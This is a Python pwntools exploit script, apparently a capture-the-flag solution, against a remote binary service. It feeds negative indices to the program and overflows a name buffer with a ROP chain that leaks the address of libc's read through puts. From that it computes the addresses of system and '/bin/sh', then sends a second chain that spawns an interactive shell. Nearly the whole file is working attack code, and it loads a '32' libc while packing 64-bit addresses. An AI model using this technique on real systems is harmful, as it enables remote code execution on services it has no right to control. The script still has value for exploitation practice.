#!/usr/bin/python
#coding:utf-8
'''
'''
import sys, string, re
from pwn import *

libc = ELF("./libc-32.so")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#context.log_level = 'debug'
#p = process('./second')
p = remote('10.105.42.5', 2335)
system_libc = libc.symbols['system']
read_libc = libc.symbols['read']

sh_libc = list(libc.search('/bin/sh\x00'))
print system_libc, read_libc, sh_libc
#sys.exit(1)

for i in xrange(8):
    p.recvuntil('number:')
    p.sendline(str(i))

p.recvuntil('How many number do you want to see?\n')
p.sendline(str(-1))

p.recvuntil('which lucky number you want to seek: \n')
p.sendline(str(-1))

p.recvuntil('Your name:\n')
evil_addr = 0x4008FC
pop_rdi_ret = 0x400983
printf_plt = 0x4005f0
read_plt = 0x400600
puts_plt = 0x4005d0
bss = 0x601070
read_got = 0x601030
payload = 'A' * 24 + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(evil_addr)
#payload = 'A' * (17 * 8 -1 )
p.sendline(payload)
leak_read_addr = p.recvuntil('Your name:\n')[33:39]
read_addr = ''
for i in xrange(len(leak_read_addr)):
    #print i
    read_addr += leak_read_addr[len(leak_read_addr) -1 -i]
    
system_addr = int(read_addr.encode('hex'),16) - (read_libc - system_libc)
print leak_read_addr.encode('hex'), read_addr.encode('hex'), hex(system_addr)

sh_addr = int(read_addr.encode('hex'),16) - (read_libc - sh_libc[0])
payload = 'A' * 24 + p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr)
p.sendline(payload)

p.interactive()

